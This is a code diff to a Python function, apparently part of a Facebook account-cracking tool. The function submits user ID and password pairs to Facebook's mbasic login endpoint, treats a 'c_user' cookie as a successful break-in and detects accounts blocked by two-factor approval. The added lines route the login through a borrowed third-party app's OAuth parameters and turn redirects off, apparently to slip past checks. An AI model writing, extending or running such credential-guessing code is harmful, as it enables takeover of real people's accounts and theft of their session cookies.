@@ -1277,6 +1277,16 @@ def mbasic(uid,pwx,tl):
             'wl_cbv': 'v2%3Bclient_version%3A2682%3Btimestamp%3A1732715348',
             'wd': '491x968',
             'fr': '0bPmdaDqTCILtVoFs.AWUsbcEj3O8RXn524RTVcg5s14g.BnRss6..AAA.0.0.BnRyOZ.AWVvryVfusg',}
+            params = {
+            'api_key': '607603612709461',
+            'auth_token': 'ff4f1596ae5511da71a091d36f81b691',
+            'skip_api_login': '1',
+            'signed_next': '1',
+            'next': 'https://m.facebook.com/v12.0/dialog/oauth?response_type=code&redirect_uri=https%3A%2F%2Fbikroy.com%2Ffacebook-callback&scope=public_profile%2Cemail&client_id=607603612709461&ret=login&fbapp_pres=0&logger_id=1bdecab6-4837-4a41-963c-a148f65aa25d&tp=unspecified',
+            'refsrc': 'deprecated',
+            'app_id': '607603612709461',
+            'cancel': 'https://bikroy.com/facebook-callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied#_=_',
+            'lwv': '100',}
             headers = {
             'authority': 'mbasic.facebook.com',
             'accept': '*/*',
@@ -1301,7 +1311,7 @@ def mbasic(uid,pwx,tl):
             'x-response-format': 'JSONStream',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = 'https://mbasic.facebook.com/login/device-based/login/async/'
-            po = Session.post(url, cookies=cookies, data=data, headers=headers).text
+            po = Session.post(url, params=params, cookies=cookies, headers=headers, data=data, allow_redirects = False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
